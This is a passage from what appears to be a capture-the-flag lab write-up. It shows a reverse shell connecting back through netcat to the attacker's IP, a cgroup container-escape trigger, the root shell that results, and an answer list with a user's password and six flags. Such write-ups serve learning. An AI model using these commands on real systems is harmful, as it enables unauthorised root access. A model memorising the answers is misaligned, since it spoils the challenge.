<bin/sh -i 2>&1|nc 10.8.19.103 1338 >/tmp/f" >> /cmd
root@66505608bd11:~# chmod a+x /cmd
chmod a+x /cmd
root@66505608bd11:~# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"


┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1338                                     
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.44.208] 45838
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls -lah
total 32K
drwx------  5 root root 4.0K Sep 15  2021 .
drwxr-xr-x 24 root root 4.0K Sep 15  2021 ..
-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
drwx------  2 root root 4.0K Sep 15  2021 .cache
drwxr-xr-x  3 root root 4.0K Sep 15  2021 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4.0K Sep 15  2021 .ssh
-rw-r--r--  1 root root   55 Sep 16  2021 flag
# cat flag
THM{6_though_this_be_madness_yet_there_is_method_in_t}

```

![[Pasted image 20230804211044.png]]
![[Pasted image 20230804211657.png]]

What is Michael's password?

You will, most likely, create a wordlist and test against WebAnno.

*vnsanctified*

Flag 1

*THM{1_most_mechanical_and_dirty_hand}*

Flag 2

*THM{2_ophelia_s_grave}*

Flag 3

*THM{3_i_was_the_more_deceived}*

Flag 4

*THM{4_the_murder_of_gonzago}*

Flag 5

*THM{5_murder_most_foul}*

Flag 6

*THM{6_though_this_be_madness_yet_there_is_method_in_t}*


[[Forgotten Implant]]